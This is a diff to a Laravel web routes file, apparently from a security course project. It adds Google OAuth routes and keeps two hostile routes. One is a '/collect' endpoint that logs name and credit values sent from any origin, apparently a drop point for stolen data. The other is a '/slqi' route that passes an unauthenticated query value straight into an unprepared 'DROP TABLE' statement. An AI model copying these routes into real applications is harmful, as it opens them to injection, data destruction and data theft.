@@ -4,6 +4,9 @@ use Illuminate\Support\Facades\Route;
 use App\Http\Controllers\Web\ProductsController;
 use App\Http\Controllers\Web\UsersController;
 use Illuminate\Support\Facades\Mail;
+
+
+use App\Http\Controllers\Web\AuthController;
 Route::get('register', [UsersController::class, 'register'])->name('register');
 Route::post('register', [UsersController::class, 'doRegister'])->name('do_register');
 Route::get('login', [UsersController::class, 'login'])->name('login');
@@ -19,21 +22,23 @@ Route::get('users/edit_password/{user?}', [UsersController::class, 'editPassword
 Route::post('users/save_password/{user}', [UsersController::class, 'savePassword'])->name('save_password');
 Route::get('users/charge_credit/{user}', [UsersController::class, 'chargeCreditForm'])->name('charge_credit_form')->middleware('auth');
 Route::post('users/charge_credit/{user}', [UsersController::class, 'chargeCredit'])->name('charge_credit')->middleware('auth');
-route::get('/collect',function(Request $request){
+Route::get('auth/google', [AuthController::class, 'redirectToGoogle']);
+Route::get('auth/google/callback', [AuthController::class, 'handleGoogleCallback']);
 
-    $name=$request->query('name');
-    $credit = $request->query('credit');
-    return response('collected')
-    ->header('Access-Control-Allow-Origin','*')
-    ->header('Access-Control-Allow-Methods','GET, POST , OPTIONS')
-    ->header('Access-Control-Allow-hEADERS','Content-Type, X-Requested-With');
-
-});
-Route::get('/slqi',function(Request $request){
-    $table = $request->query('table');
-    DB::unprepared("DROP TABLE $table");
-    return redirect('/');
-});
+    Route::get('/collect', function (Request $request) {
+        $name = $request->query('name');
+        $credit = $request->query('credit');
+        return response('collected')
+            ->header('Access-Control-Allow-Origin', '*')
+            ->header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
+            ->header('Access-Control-Allow-Headers', 'Content-Type, X-Requested-With');
+    });
+    
+    Route::get('/slqi', function (Request $request) {
+        $table = $request->query('table');
+        DB::unprepared("DROP TABLE $table");
+        return redirect('/');
+    });
 Route::get('test-email', function () {
 
     Mail::raw('This is a test email sent to the same email address.', function ($message) {
